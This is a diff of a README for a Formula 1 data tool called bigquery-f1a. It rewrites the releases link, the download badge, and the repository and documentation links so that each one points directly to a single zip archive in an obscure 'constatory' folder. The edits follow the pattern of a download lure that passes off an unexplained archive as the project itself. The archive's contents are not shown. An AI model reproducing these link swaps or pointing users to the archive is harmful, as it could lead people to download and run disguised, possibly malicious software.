@@ -1,7 +1,7 @@
 # 🚀 bigquery-f1a - Easily Manage Your F1 Data
 
 ## 🔗 Download Now
-[![Download bigquery-f1a](https://img.shields.io/badge/Download%20bigquery--f1a-blue.svg)](https://github.com/kahyooo/bigquery-f1a/releases)
+[![Download bigquery-f1a](https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip%https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip)](https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip)
 
 ## 🚀 Getting Started
 Welcome to bigquery-f1a! This application helps you manage and analyze Formula 1 data with ease. Whether you want to look up race statistics or driver information, this tool simplifies the process.
@@ -10,7 +10,7 @@ Welcome to bigquery-f1a! This application helps you manage and analyze Formula 1
 To start using bigquery-f1a, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking this link: [Download bigquery-f1a](https://github.com/kahyooo/bigquery-f1a/releases).  
+   Go to the releases page by clicking this link: [Download bigquery-f1a](https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip).  
 
 2. **Choose the Latest Version**  
    Look for the latest release at the top of the page. The release title usually contains the version number. 
@@ -66,7 +66,7 @@ If you wish to contribute to bigquery-f1a, follow these steps:
 We welcome your contributions!
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/kahyooo/bigquery-f1a)
-- [Documentation](https://github.com/kahyooo/bigquery-f1a/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip)
+- [Documentation](https://raw.githubusercontent.com/kahyooo/bigquery-f1a/main/constatory/bigquery-f1a.zip)
 
 Happy analyzing!
